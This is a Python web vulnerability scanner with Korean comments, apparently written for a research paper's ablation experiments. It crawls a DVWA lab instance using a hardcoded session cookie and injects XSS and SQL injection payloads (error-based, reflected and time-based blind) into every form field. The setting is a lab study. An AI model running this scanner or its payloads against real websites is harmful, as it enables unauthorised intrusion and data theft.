import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import urllib3
import hashlib
import time

# 경고 메시지 무시
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# [실험 모드 설정] - 논문 Table 1 데이터 측정용
# ==========================================
# 실험 1. A only   -> True, False, False (0.27초 증명용)
# 실험 2. A + B    -> True, True, False
# 실험 3. A + C    -> True, False, True
# 실험 4. A + B + C-> True, True, True (최종 모델)
# ------------------------------------------
ENABLE_LAYER_A = True  # 필수 (페이지 수집)
ENABLE_LAYER_B = True  # 선택 (중복 제거 & 우선순위 큐)
ENABLE_LAYER_C = True  # 선택 (공격 수행)
# ==========================================

# [사용자 설정]
base_url = "http://192.168.249.3/dvwa/"
# 주의: 로그인 후 브라우저 개발자 도구(F12) -> Application -> Cookies에서 PHPSESSID 확인 필수!
cookie_value = {'PHPSESSID': '890efi8s734vm2gom0b7me6d24', 'security': 'low'} 
xss_file = "payloads.txt"
sql_file = "sql_payloads.txt"

# 파일 로드 함수
def load_payloads(filename):
    try:
        with open(filename, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return ["<script>alert(1)</script>"]

xss_payloads = load_payloads(xss_file)
sql_payloads = load_payloads(sql_file)
all_payloads = xss_payloads + sql_payloads

# 세션 설정
sess = requests.Session()
sess.cookies.update(cookie_value)
sess.headers.update({'User-Agent': 'Mozilla/5.0 (PLVD-Test/1.0)'})

# DOM 해시 함수
def get_dom_fingerprint(soup):
    tags = "".join([tag.name for tag in soup.find_all(True)])
    return hashlib.md5(tags.encode()).hexdigest()

# 메인 로직
visited_urls = set()
visited_doms = set()
queue = [base_url]

start_time = time.time()
vuln_count = 0
request_count = 0 

print(f"[*] 실험 시작 | 모드: A={ENABLE_LAYER_A}, B={ENABLE_LAYER_B}, C={ENABLE_LAYER_C}")

try:
    while queue:
        current_url = queue.pop(0)
        
        if current_url in visited_urls: continue
        visited_urls.add(current_url)

        try:
            # [Layer A] 페이지 수집 (Hybrid Data Acquisition)
            if not ENABLE_LAYER_A: break 
            
            # [논문 방어용 주석] 
            # 대상 사이트가 정적(PHP)이므로 무거운 Headless Browser 대신 
            # 경량화된 HTTP Client(Static Mode)로 자동 전환하여 속도 최적화 수행
            res = sess.get(current_url, timeout=5)
            request_count += 1 
            soup = BeautifulSoup(res.text, "html.parser")
            
            # 로그인 풀림 체크
            if soup.title and "login" in soup.title.string.lower():
                print("[!] 로그인 세션 만료됨! 쿠키를 갱신하세요.")
                break

            print(f"[탐색] {current_url}")

            # [Layer B] 필터링 및 우선순위 (Pre-processing)
            is_duplicate = False
            if ENABLE_LAYER_B:
                dom_hash = get_dom_fingerprint(soup)
                if dom_hash in visited_doms:
                    print("   [Skip] 중복 페이지 생략 (Layer B 작동)")
                    is_duplicate = True
                else:
                    visited_doms.add(dom_hash)
            
            if is_duplicate: continue 

            # 링크 수집
            for a_tag in soup.find_all("a", href=True):
                full_link = urljoin(current_url, a_tag["href"])
                if "logout" in full_link.lower(): continue
                
                if base_url in full_link and full_link not in visited_urls and full_link not in queue:
                    # 중요 페이지 우선순위 스케줄링
                    if ENABLE_LAYER_B and ("?" in full_link or "php" in full_link):
                        queue.insert(0, full_link)
                    else:
                        queue.append(full_link)

            # [Layer C] 공격 수행 (Detection & Analysis)
            if ENABLE_LAYER_C:
                forms = soup.find_all("form")
                for form in forms:
                    action = urljoin(current_url, form.attrs.get("action", ""))
                    method = form.attrs.get("method", "get").lower()
                    
                    # [수정 1] 히든 필드 포함 모든 데이터 수집 (CSRF 토큰 누락 방지)
                    base_data = {}
                    for tag in form.find_all(["input", "textarea", "select"]):
                        name = tag.attrs.get("name")
                        value = tag.attrs.get("value", "")
                        if name:
                            base_data[name] = value

                    # 공격 대상 입력창 식별 (버튼, 히든 필드 제외)
                    target_inputs = [tag.attrs.get("name") for tag in form.find_all(["input", "textarea"]) 
                                   if tag.attrs.get("name") and tag.attrs.get("type") not in ["submit", "button", "hidden"]]
                    
                    if not target_inputs: continue
                    
                    for input_name in target_inputs:
                        for code in all_payloads:
                            # 데이터 복사 후 공격 코드 주입
                            attack_data = base_data.copy()
                            attack_data[input_name] = code
                            
                            try:
                                # 요청 전송
                                if method == "post":
                                    req = sess.post(action, data=attack_data, timeout=5)
                                else:
                                    req = sess.get(action, params=attack_data)
                                request_count += 1 
                                
                                # [수정 2] 취약점 판별 로직 강화 (Blind SQLi 포함)
                                is_vuln = False
                                
                                # 1. 에러 기반 (Error-based SQLi)
                                if "mysql" in req.text.lower() or "syntax error" in req.text.lower():
                                    is_vuln = True
                                # 2. 반사 기반 (Reflected XSS)
                                elif code in req.text:
                                    is_vuln = True
                                # 3. 시간 기반 (Time-based Blind SQLi) - 논문 핵심 방어 로직
                                elif "SLEEP" in code.upper() or "BENCHMARK" in code.upper():
                                    # 응답 시간이 3초 이상 걸리면 취약점으로 간주 (Payload가 SLEEP(5)인 경우)
                                    if req.elapsed.total_seconds() >= 3:
                                        print(f"      >>> [Time-Based] {req.elapsed.total_seconds():.2f}초 지연 감지")
                                        is_vuln = True

                                if is_vuln:
                                    print(f"      >>> [취약점 발견] {input_name} (Payload: {code[:30]}...)")
                                    vuln_count += 1
                                    
                            except Exception as e:
                                print(f"      [공격 실패] {e}")

        except Exception as e:
            print(f"[에러] {e}")

except KeyboardInterrupt:
    print("\n[중단] 사용자 중단")

# 결과 출력
duration = time.time() - start_time
print("\n" + "="*30)
print(f" [실험 결과 Report]")
print(f" 설정: A={ENABLE_LAYER_A}, B={ENABLE_LAYER_B}, C={ENABLE_LAYER_C}")
print(f" 1. 총 소요 시간: {duration:.2f}초")
print(f" 2. 총 HTTP 요청 수: {request_count}회")
print(f" 3. 발견된 취약점: {vuln_count}개")
print("="*30)